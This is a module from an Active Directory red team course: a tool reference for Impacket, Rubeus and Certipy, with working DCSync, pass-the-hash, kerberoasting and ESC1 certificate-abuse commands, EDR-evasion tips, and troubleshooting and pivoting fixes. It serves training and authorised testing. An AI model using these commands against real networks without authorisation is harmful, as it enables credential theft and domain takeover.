# Module 10: Field Operator Playbook & Troubleshooting Reference

> **Navigation**: [⬅️ Module 09: Domain Dominance & DCSync](Module-09-Domain-Dominance-Persistence-and-DCSync.md) | [🏠 Master Index](../README.md) | [Module 11: Zero-Trust Defense & SIEM ➡️](Module-11-Enterprise-Defense-Zero-Trust-and-Detection.md)

---


## 1. Tool Mastery: Complete Command Flags & Parameters

This reference breaks down the essential offensive tradecraft tools used on engagements, documenting every critical command flag, expected behavior, and OPSEC implication.

---

### 1. Impacket Command Reference

Impacket (by SecureAuth / Fortra) is the backbone of remote Linux-to-Windows Active Directory assessment.

#### A. `impacket-secretsdump`
Extracts credentials (NTLM hashes, Kerberos AES keys, cleartext LSA secrets) via DCSync or local registry hives.

```bash
# Syntax:
impacket-secretsdump [flags] <domain>/<user>:<password>@<target_ip>
```

| Flag | Argument | Description & Tradecraft Usage |
| :--- | :--- | :--- |
| **`-just-dc-user`** | `<username>` | Dumps ONLY the specified user via DCSync. Drastically reduces network traffic and avoids mass log flooding. |
| **`-just-dc`** | None | Dumps all Active Directory accounts from the target DC. Generates thousands of replication packets. |
| **`-just-dc-ntlm`** | None | Dumps only NT hashes, skipping Kerberos keys and history hashes to minimize output size. |
| **`-pwd-last-set`** | None | Displays when each account's password was last changed (critical for identifying stale/legacy service accounts). |
| **`-history`** | None | Dumps previous password hashes stored in the password history pool (`ntds.dit`). |
| **`-user-status`** | None | Displays whether the account is disabled, expired, or locked out. |
| **`-hashes`** | `LM:NT` | Executes Pass-the-Hash (PTH). Pass empty LM hash: `-hashes :e5fc4f2b49d70367b54da724e1185ac4`. |
| **`-k`** | None | Uses Kerberos authentication instead of NTLM. Requires valid ticket in `KRB5CCNAME`. |
| **`-no-pass`** | None | Suppresses password prompt (mandatory when using `-k` Kerberos tickets). |
| **`-dc-ip`** | `<ip>` | Explicit IP address of the Domain Controller to bind to for LDAP/RPC queries. |

---

#### B. `impacket-psexec`, `wmiexec`, and `smbexec`
Provides remote command execution on target member servers and workstations.

| Tool | Protocol & Mechanism | Service / Artifacts Created | EDR Detection Footprint |
| :--- | :--- | :--- | :--- |
| **`psexec.py`** | SMB (Port 445). Uploads a random binary (e.g., `BjkL.exe`) to `ADMIN$` share and registers a service. | Creates Windows Service (`Event ID 7045`). | **Extremely High**. Detected by virtually all modern EDRs. |
| **`smbexec.py`** | SMB (Port 445). Creates a temporary service that executes via `cmd.exe /Q /c <cmd> > \\127.0.0.1\C$\__output`. | Creates temporary service; leaves output file. | **High**. Monitored by service creation heuristics. |
| **`wmiexec.py`** | WMI (Port 135 + Dynamic RPC). Spawns process via `Win32_Process.Create()`. Output retrieved via SMB. | **Zero service creation**. Spawns child of `WmiPrvSE.exe`. | **Stealthier**. Standard red team administrative choice. |

```bash
# Example WMIExec execution using Kerberos ticket:
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass 'corp.local/Administrator@sql01.corp.local'
```

---

#### C. `impacket-getST` (Service Ticket / S4U)
Requests Kerberos Service Tickets for Constrained Delegation and RBCD exploitation.

| Flag | Argument | Operational Usage |
| :--- | :--- | :--- |
| **`-spn`** | `<service/host>` | Target SPN to request (e.g., `cifs/sql01.corp.local`). |
| **`-impersonate`** | `<username>` | Target user to impersonate via S4U (e.g., `Administrator`). |
| **`-altservice`** | `<service>` | Alternative service name substitution (e.g., requests `cifs` even if SPN was `http`). |
| **`-force-forwardable`**| None | Forces forwardable flag in ticket (required for nested delegation). |

---

### 2. Rubeus Command Reference (Windows C#)

Rubeus (by GhostPack) is the ultimate C# toolset for raw Kerberos interaction on Windows endpoints.

| Subcommand | Flag | Description & Tradecraft Usage |
| :--- | :--- | :--- |
| **`kerberoast`** | `/nowrap` | Prevents base64 ticket wrapping across multiple terminal lines (prevents Hashcat parsing errors). |
| **`kerberoast`** | `/rc4opsec` | Requests RC4 tickets for accounts with `adminCount=1`, minimizing noisy requests for non-admin accounts. |
| **`kerberoast`** | `/tgtdeleg` | Extracts a forwardable TGT via fake unconstrained delegation to request TGS tickets without querying the KDC directly. |
| **`asreproast`** | `/format:hashcat` | Outputs captured AS-REP hashes in native Hashcat `$krb5asrep$23$` format. |
| **`s4u`** | `/impersonate:<user>` | Executes S4U2self and S4U2proxy to obtain an impersonated service ticket. |
| **`s4u`** | `/ptt` | Directly injects the resulting impersonated service ticket into the current Windows logon session! |
| **`ptt`** | `/ticket:<base64/file>`| Injects a base64 `.kirbi` Kerberos ticket into current session memory. |
| **`purge`** | None | Purges all cached Kerberos tickets from the current Windows session (`klist purge`). |

---

### 3. Certipy Command Reference (AD CS)

Certipy (by Oliver Lyak) automates Active Directory Certificate Services enumeration and abuse.

```bash
# Enumerate all vulnerable templates in the domain:
certipy find -vulnerable -stdout -u 'jdoe' -p 'Pass123!' -dc-ip 10.0.0.1

# Request an ESC1 certificate specifying Administrator SAN:
certipy req -username 'jdoe' -password 'Pass123!' -ca 'corp-CA01-CA' \
  -target ca01.corp.local -template 'UserAuth' -upn 'administrator@corp.local'

# Authenticate via PKINIT to dump Administrator NT hash:
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

---

## 2. The Comprehensive Troubleshooting & Error Codes Matrix

When operating in real enterprise networks, commands fail due to time synchronization, firewall rules, security policies, and protocol constraints. The following matrix documents root causes and exact operational workarounds:

```
+-------------------------------------------------------------------------------------------------------------------+
| COMPREHENSIVE ACTIVE DIRECTORY OPERATOR TROUBLESHOOTING MATRIX                                                    |
+------------------------------------+------------------------------------+-----------------------------------------+
| Error Code / Message               | Technical Root Cause               | Operational Troubleshooting & Fix       |
+------------------------------------+------------------------------------+-----------------------------------------+
| **KRB_AP_ERR_SKEW (0x25 / 37)**    | Clock skew between attack machine  | Synchronize attack box time to target DC|
| "Clock skew too great"             | and Domain Controller exceeds      | 1. rdate -n <DC_IP>  OR ntpdate <DC_IP> |
|                                    | 5 minutes (300 seconds).           | 2. If UDP 123 (NTP) is firewalled, sync |
|                                    |                                    |    via HTTP Date header:                |
|                                    |                                    |    date -s "$(curl -sI http://<DC_IP>   |
|                                    |                                    |    | grep -i Date: | cut -d' ' -f2-)"   |
+------------------------------------+------------------------------------+-----------------------------------------+
| **KDC_ERR_S_PRINCIPAL_UNKNOWN (7)**| The requested SPN does not exist   | Check SPN spelling. Verify SPN exists:  |
| "Server not found in Kerberos db"  | or is assigned to multiple objects | ldapsearch ... "(servicePrincipalName=*)|
|                                    | (Duplicate SPN collision).         | Use FQDN instead of NetBIOS hostname.   |
+------------------------------------+------------------------------------+-----------------------------------------+
| **KDC_ERR_PREAUTH_FAILED (0x18)**  | Password provided for user in      | Verify password. Account password was   |
| "Pre-authentication failed"        | AS-REQ is incorrect.               | changed or mistyped. Avoid repeating    |
|                                    |                                    | to prevent triggering account lockout!  |
+------------------------------------+------------------------------------+-----------------------------------------+
| **KDC_ERR_BADOPTION (0xd / 13)**   | Target account is marked with flag | The target account cannot be delegated. |
| "KDC cannot accommodate requested  | NOT_DELEGATED (0x100000) or is a   | Choose another administrative target    |
| option"                            | member of "Protected Users".       | not restricted by delegation policy.    |
+------------------------------------+------------------------------------+-----------------------------------------+
| **STATUS_LOGON_FAILURE (0xc000006d| Bad credentials or disabled account| Check if account is disabled/expired via|
| Substatus: 0xc000006a)**           | submitted during NTLM handshake.   | ldapsearch or NetExec.                  |
+------------------------------------+------------------------------------+-----------------------------------------+
| **STATUS_ACCOUNT_LOCKED_OUT**      | Account lockout threshold exceeded | STOP ALL PASSWORD SPRAYS IMMEDIATELY!   |
| (0xc0000234)                       | (e.g., 5 bad attempts in 30 mins). | Query badPwdCount via LDAP before spray.|
+------------------------------------+------------------------------------+-----------------------------------------+
| **STATUS_PASSWORD_EXPIRED**        | User password has expired; account | Change password via smbpasswd / RPC:    |
| (0xc0000071)                       | must change password at next logon.| smbpasswd -r <DC_IP> -U <user>          |
+------------------------------------+------------------------------------+-----------------------------------------+
| **STATUS_ACCESS_DENIED (0xc0000022| User has valid credentials, but is | 1. UAC Remote Restrictions blocking     |
| on ADMIN$ / C$)                    | denied access to administrative    |    local admin: Set registry            |
|                                    | network shares.                    |    LocalAccountTokenFilterPolicy = 1.   |
|                                    |                                    | 2. Connect as Domain Admin instead.     |
+------------------------------------+------------------------------------+-----------------------------------------+
| **STATUS_INVALID_PARAMETER**       | Target SMB server enforces SMB     | Relaying to SMB is impossible. Target   |
| (0xc000000d on ntlmrelayx)         | Signing (RequireSecuritySignature).| LDAP (ldap://) or HTTP ADCS instead!    |
+------------------------------------+------------------------------------+-----------------------------------------+
| **RPC_S_SERVER_UNAVAILABLE**       | Windows Firewall blocking RPC      | 1. Test port 135: nc -zvw3 <IP> 135     |
| (0x000006ba / 1722)                | dynamic port range (49152-65535)   | 2. Use WMI / SMBexec instead of RPC.    |
|                                    | or RPC Endpoint Mapper (Port 135). | 3. Pivot through a dual-homed machine.  |
+------------------------------------+------------------------------------+-----------------------------------------+
| **LDAP_STRONG_AUTH_REQUIRED (0x8)**| Target DC enforces LDAP signing or | Switch relay target to LDAPS (port 636) |
| "Strong authentication required"   | LDAP Channel Binding (CBT).        | with --channel-binding flag.            |
+------------------------------------+------------------------------------+-----------------------------------------+
```

---

## 3. Network Pivoting & Proxy Routing Pitfalls

When tunneling tools through internal pivot proxies (e.g., **Chisel**, **Ligolo-ng**, or **SSH Dynamic SOCKS**), operators frequently encounter failures with Kerberos and name resolution:

### Pitfall 1: DNS Resolution Over SOCKS Proxies
Many tools fail because your local Kali machine attempts to resolve `corp.local` hostnames using your local ISP DNS rather than the target internal DNS server.
* **Resolution**:
  1. Add domain entries directly to `/etc/hosts`:
     ```
     10.0.0.1   dc01.corp.local corp.local
     10.0.0.2   ca01.corp.local
     10.0.0.22  sql01.corp.local
     ```
  2. Configure `/etc/proxychains4.conf`:
     - Enable `proxy_dns` if using SOCKS5 with remote DNS resolution.
     - Ensure the proxy port matches your tunnel (e.g., `socks5 127.0.0.1 1080`).

### Pitfall 2: Kerberos UDP vs. TCP Tunneling
By default, Kerberos communicates over **UDP port 88**. Standard SOCKS proxies (SOCKS4 and most SOCKS5 implementations) **do not support UDP traffic**.
* **The Symptom**: Tools hang indefinitely or report `Cannot contact KDC`.
* **The Solution**: Force Linux Kerberos to use **TCP only** by configuring `/etc/krb5.conf`:
  ```ini
  [libdefaults]
      default_realm = CORP.LOCAL
      dns_lookup_realm = false
      dns_lookup_kdc = false
      ticket_lifetime = 24h
      renew_lifetime = 7d
      forwardable = true
      udp_preference_limit = 1   # <--- FORCES TCP ONLY (Values <= 1 force TCP)

  [realms]
      CORP.LOCAL = {
          kdc = tcp/10.0.0.1:88
          admin_server = tcp/10.0.0.1:88
      }
  ```

---

### Pitfall 3: Converting Ticket Formats (Linux `.ccache` vs. Windows `.kirbi`)
Impacket and Linux tools require tickets in MIT `.ccache` format. Mimikatz and Rubeus require tickets in Windows `.kirbi` format.

```bash
# Convert Windows .kirbi to Linux .ccache:
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache

# Convert Linux .ccache to Windows .kirbi:
impacket-ticketConverter ticket.ccache ticket.kirbi
```

---

## 4. Network Packet Inspection & Display Filters (Wireshark & Tcpdump)

When Kerberos or SMB authentication fails silently, packet inspection on the network interface confirms whether the Domain Controller received the packet, dropped it, or returned a Kerberos error code:

```
+---------------------------------------------------------------------------------------+
| ESSENTIAL ACTIVE DIRECTORY WIRESHARK & TCPDUMP DISPLAY FILTERS                        |
+--------------------------+------------------------------------------------------------+
| Protocol / Inspection    | Wireshark Display Filter Syntax                            |
+--------------------------+------------------------------------------------------------+
| **Kerberos AS-REQ**      | `kerberos.msg.type == 10`                                  |
| (Initial Authentication) | Verifies client encryption types and PA-DATA timestamp.    |
+--------------------------+------------------------------------------------------------+
| **Kerberos AS-REP**      | `kerberos.msg.type == 11`                                  |
| (TGT Issuance)           | Confirms KDC issued the TGT.                               |
+--------------------------+------------------------------------------------------------+
| **Kerberos TGS-REQ**     | `kerberos.msg.type == 12`                                  |
| (Service Ticket Request) | Inspects requested SPN and ticket flags.                   |
+--------------------------+------------------------------------------------------------+
| **Kerberos TGS-REP**     | `kerberos.msg.type == 13`                                  |
| (Service Ticket Return)  | Verifies ticket encryption type (etype 23 vs 18).          |
+--------------------------+------------------------------------------------------------+
| **Kerberos Errors**      | `kerberos.msg.type == 30`                                  |
| (KRB-ERROR)              | Specifically filters: `kerberos.error_code == 37` (Clock   |
|                          | Skew) or `kerberos.error_code == 7` (Unknown Principal).   |
+--------------------------+------------------------------------------------------------+
| **SMB2 Negotiate**       | `smb2.cmd == 0`                                            |
| (Dialect & Signing Check)| Inspects `SecurityMode` for `Signing Enabled` / `Required`.|
+--------------------------+------------------------------------------------------------+
| **LDAP Search Filter**   | `ldap.protocolOp == 3`                                     |
| (Directory Enumeration)  | Filters Active Directory object queries.                   |
+--------------------------+------------------------------------------------------------+
```

### Tcpdump Command Line Syntax for Headless Red Team Boxes:
```bash
# Capture all Kerberos port 88 traffic on interface eth0:
sudo tcpdump -i eth0 -nn -s0 -v "port 88" -w kerberos_traffic.pcap

# Capture LLMNR and NBT-NS broadcast resolution traffic:
sudo tcpdump -i eth0 -nn "udp port 5355 or udp port 137"
```

---

> **Navigation**: [⬅️ Module 09: Domain Dominance & DCSync](Module-09-Domain-Dominance-Persistence-and-DCSync.md) | [🏠 Master Index](../README.md) | [Module 11: Zero-Trust Defense & SIEM ➡️](Module-11-Enterprise-Defense-Zero-Trust-and-Detection.md)
